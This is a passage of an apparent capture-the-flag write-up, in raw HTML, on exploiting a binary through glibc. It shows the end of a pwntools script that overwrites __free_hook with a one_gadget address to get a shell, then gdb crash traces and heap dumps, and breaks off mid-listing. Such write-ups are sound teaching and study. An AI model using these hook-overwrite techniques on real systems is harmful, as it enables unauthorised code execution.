+</span></span><span class=line><span class=cl><span class=n>free_hook</span> <span class=o>=</span> <span class=mh>0x00000000001EEB28</span><span class=o>+</span><span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=o>.</span><span class=n>address</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Input your message:&#39;</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=o>.</span><span class=n>select_gadget</span><span class=p>(</span><span class=mi>1</span><span class=p>)))</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Where to write?:&#39;</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=n>free_hook</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Any last message?:&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\0</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>Things are never so simple, of course.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>[</span><span class=n>DEBUG</span><span class=p>]</span> <span class=n>Received</span> <span class=mh>0x12</span> <span class=nb>bytes</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s1>&#39;Any last message?:&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>DEBUG</span><span class=p>]</span> <span class=n>Sent</span> <span class=mh>0x1</span> <span class=nb>bytes</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=mi>0</span> <span class=o>*</span> <span class=mh>0x1</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Switching</span> <span class=n>to</span> <span class=n>interactive</span> <span class=n>mode</span>
+</span></span><span class=line><span class=cl><span class=err>$</span> <span class=n>ls</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=n>DEBUG</span><span class=p>]</span> <span class=n>Sent</span> <span class=mh>0x3</span> <span class=nb>bytes</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=sa>b</span><span class=s1>&#39;ls</span><span class=se>\n</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Got</span> <span class=n>EOF</span> <span class=k>while</span> <span class=n>reading</span> <span class=ow>in</span> <span class=n>interactive</span>
+</span></span><span class=line><span class=cl><span class=err>$</span>
+</span></span></code></pre></td></tr></table></div></div><p>A little backtracing in <code>gdb</code> shows the issue. First, we&rsquo;ll let it crash, and observe the backtrace:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=p>[</span><span class=err>#</span><span class=mi>0</span><span class=p>]</span> <span class=n>Id</span> <span class=mi>1</span><span class=p>,</span> <span class=nl>Name</span><span class=p>:</span> <span class=s>&#34;ld-linux-x86-64&#34;</span><span class=p>,</span> <span class=n>stopped</span> <span class=mh>0x555556b192a0</span> <span class=n>in</span> <span class=o>??</span> <span class=p>(),</span> <span class=nl>reason</span><span class=p>:</span> <span class=n>SIGSEGV</span>
+</span></span><span class=line><span class=cl> <span class=n>trace</span> 
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=err>#</span><span class=mi>0</span><span class=p>]</span> <span class=mh>0x555556b192a0</span> <span class=err>→</span> <span class=n>out</span> <span class=mh>0x3c</span><span class=p>,</span> <span class=n>al</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=err>#</span><span class=mi>1</span><span class=p>]</span> <span class=mh>0x7f53d96b2376</span> <span class=err>→</span> <span class=n>mov</span> <span class=n>eax</span><span class=p>,</span> <span class=mh>0x0</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=err>#</span><span class=mi>2</span><span class=p>]</span> <span class=mh>0x7f53d96abb28</span> <span class=err>→</span> <span class=n>__after_morecore_hook</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=err>#</span><span class=mi>3</span><span class=p>]</span> <span class=mh>0x555556b192a0</span> <span class=err>→</span> <span class=n>out</span> <span class=mh>0x3c</span><span class=p>,</span> <span class=n>al</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=err>#</span><span class=mi>4</span><span class=p>]</span> <span class=mh>0x555556b195b0</span> <span class=err>→</span> <span class=n>add</span> <span class=n>BYTE</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rax</span><span class=p>],</span> <span class=n>al</span>
+</span></span></code></pre></td></tr></table></div></div><p>The backtrace isn&rsquo;t actually that helpful, so I just hit <code>n</code> and <code>s</code> continually until I isolated the crashing instruction:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=err>$</span><span class=nl>rax</span>   <span class=p>:</span> <span class=mh>0x0000555555fa02a0</span>  <span class=err>→</span>  <span class=mh>0x00007f776fd29ce6</span>  <span class=err>→</span>  <span class=o>&lt;</span><span class=n>execvpe</span><span class=o>+</span><span class=mi>1142</span><span class=o>&gt;</span> <span class=n>mov</span> <span class=n>rsi</span><span class=p>,</span> <span class=n>r10</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>rbx</span>   <span class=p>:</span> <span class=mh>0x00007f776fe383a0</span>  <span class=err>→</span>  <span class=mh>0x8d4c5741fa1e0ff3</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>rcx</span>   <span class=p>:</span> <span class=mh>0x00007f776fd53fb2</span>  <span class=err>→</span>  <span class=mh>0x5677fffff0003d48</span> <span class=p>(</span><span class=s>&#34;H=&#34;</span><span class=o>?</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>rdx</span>   <span class=p>:</span> <span class=mh>0x2f</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>rsp</span>   <span class=p>:</span> <span class=mh>0x00007fff3250f9f8</span>  <span class=err>→</span>  <span class=mh>0x00007f776fe38376</span>  <span class=err>→</span>  <span class=mh>0x4d8b4800000000b8</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>rbp</span>   <span class=p>:</span> <span class=mh>0x00007fff3250fa20</span>  <span class=err>→</span>  <span class=mh>0x0000000000000000</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>rsi</span>   <span class=p>:</span> <span class=mh>0x00007f776fe38376</span>  <span class=err>→</span>  <span class=mh>0x4d8b4800000000b8</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>rdi</span>   <span class=p>:</span> <span class=mh>0x0000555555fa05b0</span>  <span class=err>→</span>  <span class=mh>0x0a65657266206200</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>rip</span>   <span class=p>:</span> <span class=mh>0x00007f776fce08f1</span>  <span class=err>→</span>  <span class=o>&lt;</span><span class=n>free</span><span class=o>+</span><span class=mi>161</span><span class=o>&gt;</span> <span class=n>jmp</span> <span class=n>rax</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>r8</span>    <span class=p>:</span> <span class=mh>0x0000555555fa05b0</span>  <span class=err>→</span>  <span class=mh>0x0a65657266206200</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>r9</span>    <span class=p>:</span> <span class=mh>0x00007f776fc4a548</span>  <span class=err>→</span>  <span class=mh>0x0000000000000000</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>r10</span>   <span class=p>:</span> <span class=mh>0x00007f776fe2ebe0</span>  <span class=err>→</span>  <span class=mh>0x0000555555fa05e0</span>  <span class=err>→</span>  <span class=mh>0x0000000000000000</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>r11</span>   <span class=p>:</span> <span class=mh>0x246</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>r12</span>   <span class=p>:</span> <span class=mh>0x00007f776fe38150</span>  <span class=err>→</span>  <span class=mh>0x8949ed31fa1e0ff3</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>r13</span>   <span class=p>:</span> <span class=mh>0x00007fff3250fb08</span>  <span class=err>→</span>  <span class=mh>0x000000000000001c</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>r14</span>   <span class=p>:</span> <span class=mh>0x0</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>r15</span>   <span class=p>:</span> <span class=mh>0x0</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>eflags</span><span class=p>:</span> <span class=p>[</span><span class=n>zero</span> <span class=n>carry</span> <span class=n>parity</span> <span class=n>adjust</span> <span class=n>sign</span> <span class=n>trap</span> <span class=n>INTERRUPT</span> <span class=n>direction</span> <span class=n>overflow</span> <span class=n>resume</span> <span class=n>virtualx86</span> <span class=n>identification</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=err>$</span><span class=nl>cs</span><span class=p>:</span> <span class=mh>0x0033</span> <span class=err>$</span><span class=nl>ss</span><span class=p>:</span> <span class=mh>0x002b</span> <span class=err>$</span><span class=nl>ds</span><span class=p>:</span> <span class=mh>0x0000</span> <span class=err>$</span><span class=nl>es</span><span class=p>:</span> <span class=mh>0x0000</span> <span class=err>$</span><span class=nl>fs</span><span class=p>:</span> <span class=mh>0x0000</span> <span class=err>$</span><span class=nl>gs</span><span class=p>:</span> <span class=mh>0x0000</span>
+</span></span><span class=line><span class=cl> <span class=n>stack</span> 
+</span></span><span class=line><span class=cl><span class=mh>0x00007fff3250f9f8</span><span class=err>│</span><span class=o>+</span><span class=mh>0x0000</span><span class=o>:</span> <span class=mh>0x00007f776fe38376</span>  <span class=err>→</span>  <span class=mh>0x4d8b4800000000b8</span>    <span class=err>←</span> <span class=err>$</span><span class=n>rsp</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007fff3250fa00</span><span class=err>│</span><span class=o>+</span><span class=mh>0x0008</span><span class=o>:</span> <span class=mh>0x00007f776fe31b28</span>  <span class=err>→</span>  <span class=mh>0x0000555555fa02a0</span>  <span class=err>→</span>  <span class=mh>0x00007f776fd29ce6</span>  <span class=err>→</span>  <span class=o>&lt;</span><span class=n>execvpe</span><span class=o>+</span><span class=mi>1142</span><span class=o>&gt;</span> <span class=n>mov</span> <span class=n>rsi</span><span class=p>,</span> <span class=n>r10</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007fff3250fa08</span><span class=err>│</span><span class=o>+</span><span class=mh>0x0010</span><span class=o>:</span> <span class=mh>0x0000555555fa02a0</span>  <span class=err>→</span>  <span class=mh>0x00007f776fd29ce6</span>  <span class=err>→</span>  <span class=o>&lt;</span><span class=n>execvpe</span><span class=o>+</span><span class=mi>1142</span><span class=o>&gt;</span> <span class=n>mov</span> <span class=n>rsi</span><span class=p>,</span> <span class=n>r10</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007fff3250fa10</span><span class=err>│</span><span class=o>+</span><span class=mh>0x0018</span><span class=o>:</span> <span class=mh>0x0000555555fa05b0</span>  <span class=err>→</span>  <span class=mh>0x0a65657266206200</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007fff3250fa18</span><span class=err>│</span><span class=o>+</span><span class=mh>0x0020</span><span class=o>:</span> <span class=mh>0xececd8c03b604200</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007fff3250fa20</span><span class=err>│</span><span class=o>+</span><span class=mh>0x0028</span><span class=o>:</span> <span class=mh>0x0000000000000000</span>   <span class=err>←</span> <span class=err>$</span><span class=n>rbp</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007fff3250fa28</span><span class=err>│</span><span class=o>+</span><span class=mh>0x0030</span><span class=o>:</span> <span class=mh>0x00007f776fc6a0b3</span>  <span class=err>→</span>  <span class=o>&lt;</span><span class=n>__libc_start_main</span><span class=o>+</span><span class=mi>243</span><span class=o>&gt;</span> <span class=n>mov</span> <span class=n>edi</span><span class=p>,</span> <span class=n>eax</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007fff3250fa30</span><span class=err>│</span><span class=o>+</span><span class=mh>0x0038</span><span class=o>:</span> <span class=mh>0x0000000000000000</span>
+</span></span><span class=line><span class=cl> <span class=nl>code</span><span class=p>:</span><span class=nl>x86</span><span class=p>:</span><span class=mi>64</span> 
+</span></span><span class=line><span class=cl>   <span class=mh>0x7f776fce08e5</span> <span class=o>&lt;</span><span class=n>free</span><span class=o>+</span><span class=mi>149</span><span class=o>&gt;</span>       <span class=n>nop</span>    <span class=n>DWORD</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rax</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>   <span class=mh>0x7f776fce08e8</span> <span class=o>&lt;</span><span class=n>free</span><span class=o>+</span><span class=mi>152</span><span class=o>&gt;</span>       <span class=n>mov</span>    <span class=n>rsi</span><span class=p>,</span> <span class=n>QWORD</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rsp</span><span class=o>+</span><span class=mh>0x18</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>   <span class=mh>0x7f776fce08ed</span> <span class=o>&lt;</span><span class=n>free</span><span class=o>+</span><span class=mi>157</span><span class=o>&gt;</span>       <span class=n>add</span>    <span class=n>rsp</span><span class=p>,</span> <span class=mh>0x18</span>
+</span></span><span class=line><span class=cl> <span class=err>→</span> <span class=mh>0x7f776fce08f1</span> <span class=o>&lt;</span><span class=n>free</span><span class=o>+</span><span class=mi>161</span><span class=o>&gt;</span>       <span class=n>jmp</span>    <span class=n>rax</span>
+</span></span><span class=line><span class=cl>   <span class=mh>0x7f776fce08f3</span> <span class=o>&lt;</span><span class=n>free</span><span class=o>+</span><span class=mi>163</span><span class=o>&gt;</span>       <span class=n>nop</span>    <span class=n>DWORD</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rax</span><span class=o>+</span><span class=n>rax</span><span class=o>*</span><span class=mi>1</span><span class=o>+</span><span class=mh>0x0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>   <span class=mh>0x7f776fce08f8</span> <span class=o>&lt;</span><span class=n>free</span><span class=o>+</span><span class=mi>168</span><span class=o>&gt;</span>       <span class=n>cmp</span>    <span class=n>QWORD</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rip</span><span class=o>+</span><span class=mh>0x151279</span><span class=p>],</span> <span class=n>rsi</span>        <span class=err>#</span> <span class=mh>0x7f776fe31b78</span>
+</span></span><span class=line><span class=cl>   <span class=mh>0x7f776fce08ff</span> <span class=o>&lt;</span><span class=n>free</span><span class=o>+</span><span class=mi>175</span><span class=o>&gt;</span>       <span class=n>ja</span>     <span class=mh>0x7f776fce090a</span> <span class=o>&lt;</span><span class=n>free</span><span class=o>+</span><span class=mi>186</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl>   <span class=mh>0x7f776fce0901</span> <span class=o>&lt;</span><span class=n>free</span><span class=o>+</span><span class=mi>177</span><span class=o>&gt;</span>       <span class=n>cmp</span>    <span class=n>QWORD</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rip</span><span class=o>+</span><span class=mh>0x151268</span><span class=p>],</span> <span class=n>rsi</span>        <span class=err>#</span> <span class=mh>0x7f776fe31b70</span>
+</span></span><span class=line><span class=cl>   <span class=mh>0x7f776fce0908</span> <span class=o>&lt;</span><span class=n>free</span><span class=o>+</span><span class=mi>184</span><span class=o>&gt;</span>       <span class=n>ja</span>     <span class=mh>0x7f776fce08cb</span> <span class=o>&lt;</span><span class=n>free</span><span class=o>+</span><span class=mi>123</span><span class=o>&gt;</span>
+</span></span><span class=line><span class=cl> <span class=n>threads</span> 
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=err>#</span><span class=mi>0</span><span class=p>]</span> <span class=n>Id</span> <span class=mi>1</span><span class=p>,</span> <span class=nl>Name</span><span class=p>:</span> <span class=s>&#34;ld-linux-x86-64&#34;</span><span class=p>,</span> <span class=n>stopped</span> <span class=mh>0x7f776fce08f1</span> <span class=n>in</span> <span class=n>free</span> <span class=p>(),</span> <span class=nl>reason</span><span class=p>:</span> <span class=n>SINGLE</span> <span class=n>STEP</span>
+</span></span><span class=line><span class=cl> <span class=n>trace</span> 
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=err>#</span><span class=mi>0</span><span class=p>]</span> <span class=mh>0x7f776fce08f1</span> <span class=err>→</span> <span class=n>free</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=err>#</span><span class=mi>1</span><span class=p>]</span> <span class=mh>0x7f776fe38376</span> <span class=err>→</span> <span class=n>mov</span> <span class=n>eax</span><span class=p>,</span> <span class=mh>0x0</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=err>#</span><span class=mi>2</span><span class=p>]</span> <span class=mh>0x7f776fe31b28</span> <span class=err>→</span> <span class=n>__after_morecore_hook</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=err>#</span><span class=mi>3</span><span class=p>]</span> <span class=mh>0x555555fa02a0</span> <span class=err>→</span> <span class=n>out</span> <span class=mh>0x9c</span><span class=p>,</span> <span class=n>al</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=err>#</span><span class=mi>4</span><span class=p>]</span> <span class=mh>0x555555fa05b0</span> <span class=err>→</span> <span class=n>add</span> <span class=n>BYTE</span> <span class=n>PTR</span> <span class=p>[</span><span class=n>rdx</span><span class=o>+</span><span class=mh>0x20</span><span class=p>],</span> <span class=n>ah</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>gef</span><span class=err>➤</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>gdb</code>&rsquo;s paused here at the jump to <code>__free_hook</code>. There&rsquo;s been a slight error in logic, here: instead of jumping to <code>&lt;execvpe+1142></code> (a one_gadget), <code>__free_hook</code> is causing the program to jump to a <em>pointer to</em> the one_gadget, which is naturally non-executable.</p><p>So, instead of searching for just any important value in libc, what we should <em>really</em> be searching for is an important <em>pointer</em> in libc to a significant buffer in memory<sup>0</sup>.</p><p>My first idea was to try to overwrite the <code>FILE *</code> pointers at the end of data:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=p>.</span><span class=nl>data</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EC780</span>                 <span class=n>public</span> <span class=n>stderr</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>data</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EC780</span> <span class=n>stderr</span>          <span class=n>dq</span> <span class=n>offset</span> <span class=n>_IO_2_1_stderr_</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>data</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EC788</span>                 <span class=n>public</span> <span class=n>stdout</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>data</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EC788</span> <span class=n>stdout</span>          <span class=n>dq</span> <span class=n>offset</span> <span class=n>_IO_2_1_stdout_</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>data</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EC790</span>                 <span class=n>public</span> <span class=n>stdin</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>data</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EC790</span> <span class=n>stdin</span>           <span class=n>dq</span> <span class=n>offset</span> <span class=n>_IO_2_1_stdin_</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>data</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EC798</span>                 <span class=n>dq</span> <span class=n>offset</span> <span class=n>loc_27400</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>data</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EC798</span> <span class=n>_data</span>           <span class=n>ends</span>
+</span></span></code></pre></td></tr></table></div></div><p>If you read the footnotes<sup>1</sup>, you probably already know why this didn&rsquo;t work: they&rsquo;re essentially never used.</p><p>Eventually, I got a little bit stir-crazy looking over the IDA menu, and I realised I needed to change my approach.</p><h2 id=digging-into-mallocchttpselixirbootlincomglibcglibc-2319000sourcemallocmallocc>Digging into <a href=https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c target=_blank rel="noopener noreffer"><code>malloc.c</code></a></h2><p>Looking back at the code, I was convinced that the second allocation of memory had to be important — this was a <em>CTF</em> challenge, after all. What I didn&rsquo;t immediately understand was how glibc&rsquo;s heap system could be affected by any write-to-libc. The heap always lies on a separate page; there&rsquo;s no way to write to there directly.</p><p>Lollygagging about <code>gdb</code>, I tried to find anything that might be useful to understanding the heap.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>gef</span><span class=err>➤</span>  <span class=n>heap</span> <span class=n>chunks</span>
+</span></span><span class=line><span class=cl><span class=n>Chunk</span><span class=p>(</span><span class=n>addr</span><span class=o>=</span><span class=mh>0x555556b19010</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mh>0x290</span><span class=p>,</span> <span class=n>flags</span><span class=o>=</span><span class=n>PREV_INUSE</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mh>0x0000555556b19010</span>     <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span>    <span class=p>................]</span>
+</span></span><span class=line><span class=cl><span class=n>Chunk</span><span class=p>(</span><span class=n>addr</span><span class=o>=</span><span class=mh>0x555556b192a0</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mh>0x310</span><span class=p>,</span> <span class=n>flags</span><span class=o>=</span><span class=n>PREV_INUSE</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mh>0x0000555556b192a0</span>     <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span>    <span class=p>................]</span>
+</span></span><span class=line><span class=cl><span class=n>Chunk</span><span class=p>(</span><span class=n>addr</span><span class=o>=</span><span class=mh>0x555556b195b0</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mh>0x40</span><span class=p>,</span> <span class=n>flags</span><span class=o>=</span><span class=n>PREV_INUSE</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>[</span><span class=mh>0x0000555556b195b0</span>     <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span> <span class=mo>00</span>    <span class=p>................]</span>
+</span></span><span class=line><span class=cl><span class=n>Chunk</span><span class=p>(</span><span class=n>addr</span><span class=o>=</span><span class=mh>0x555556b195f0</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mh>0x20a20</span><span class=p>,</span> <span class=n>flags</span><span class=o>=</span><span class=n>PREV_INUSE</span><span class=p>)</span>  <span class=err>←</span>  <span class=n>top</span> <span class=n>chunk</span>
+</span></span><span class=line><span class=cl><span class=n>gef</span><span class=err>➤</span>  <span class=n>heap</span> <span class=n>bins</span>
+</span></span><span class=line><span class=cl> <span class=n>Tcachebins</span> <span class=k>for</span> <span class=n>arena</span> <span class=mh>0x7f53d96a8b80</span> 
+</span></span><span class=line><span class=cl> <span class=n>Fastbins</span> <span class=k>for</span> <span class=n>arena</span> <span class=mh>0x7f53d96a8b80</span> 
+</span></span><span class=line><span class=cl><span class=n>Fastbins</span><span class=p>[</span><span class=n>idx</span><span class=o>=</span><span class=mi>0</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mh>0x20</span><span class=p>]</span> <span class=mh>0x00</span>
+</span></span><span class=line><span class=cl><span class=n>Fastbins</span><span class=p>[</span><span class=n>idx</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mh>0x30</span><span class=p>]</span> <span class=mh>0x00</span>
+</span></span><span class=line><span class=cl><span class=n>Fastbins</span><span class=p>[</span><span class=n>idx</span><span class=o>=</span><span class=mi>2</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mh>0x40</span><span class=p>]</span> <span class=mh>0x00</span>
+</span></span><span class=line><span class=cl><span class=n>Fastbins</span><span class=p>[</span><span class=n>idx</span><span class=o>=</span><span class=mi>3</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mh>0x50</span><span class=p>]</span> <span class=mh>0x00</span>
+</span></span><span class=line><span class=cl><span class=n>Fastbins</span><span class=p>[</span><span class=n>idx</span><span class=o>=</span><span class=mi>4</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mh>0x60</span><span class=p>]</span> <span class=mh>0x00</span>
+</span></span><span class=line><span class=cl><span class=n>Fastbins</span><span class=p>[</span><span class=n>idx</span><span class=o>=</span><span class=mi>5</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mh>0x70</span><span class=p>]</span> <span class=mh>0x00</span>
+</span></span><span class=line><span class=cl><span class=n>Fastbins</span><span class=p>[</span><span class=n>idx</span><span class=o>=</span><span class=mi>6</span><span class=p>,</span> <span class=n>size</span><span class=o>=</span><span class=mh>0x80</span><span class=p>]</span> <span class=mh>0x00</span>
+</span></span><span class=line><span class=cl> <span class=n>Unsorted</span> <span class=n>Bin</span> <span class=k>for</span> <span class=n>arena</span> <span class=err>&#39;</span><span class=o>*</span><span class=mh>0x7f53d96a8b80</span><span class=err>&#39;</span> 
